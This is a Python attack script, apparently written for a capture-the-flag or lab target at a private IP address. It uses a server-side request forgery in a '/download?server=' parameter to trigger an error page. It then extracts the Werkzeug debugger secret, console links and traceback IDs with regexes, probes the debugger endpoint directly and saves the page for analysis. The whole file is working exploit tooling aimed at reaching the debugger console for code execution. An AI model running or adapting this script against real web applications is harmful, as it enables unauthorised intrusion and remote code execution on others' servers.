import requests
import re

T = "http://10.82.168.213"
r = requests.get(f"{T}/download?server=http://127.0.0.1:1/x?y=&id=1", timeout=10)

# Find debugger secret
matches = re.findall(r'[&?]s=([a-zA-Z0-9_-]+)', r.text)
print("s= matches:", matches)

links = re.findall(r'__debugger__[^"&]+', r.text)
print("Debug links:", links[:10])

# Look for SECRET in JS
js_matches = re.findall(r'SECRET\s*=\s*"([^"]+)"', r.text)
print("JS SECRET:", js_matches)

# Look for traceback ID needed for console
tb_matches = re.findall(r'traceback[^"]*"([^"]*)"', r.text, re.IGNORECASE)
print("Traceback refs:", tb_matches[:5])

# Find the console/eval link
console_matches = re.findall(r'__debugger__.*?(?:console|eval|execute)[^"]*', r.text)
print("Console links:", console_matches[:5])

# Actually try to access debugger directly (not through SSRF)
print("\n--- Direct debugger access ---")
r2 = requests.get(f"{T}/?__debugger__=yes&cmd=resource&f=style.css", timeout=8)
print(f"Direct debugger status: {r2.status_code}")

# Try triggering a direct error (not through download SSRF)
# /admin with some method that causes error?
r3 = requests.get(f"{T}/nonexistent_route", timeout=8)
print(f"/nonexistent_route: {r3.status_code}")

# Save full error page for analysis
with open("plantphoto_hunt/error_page.html", "w", encoding="utf-8") as f:
    f.write(r.text)
print(f"\nFull error page saved ({len(r.text)} bytes)")
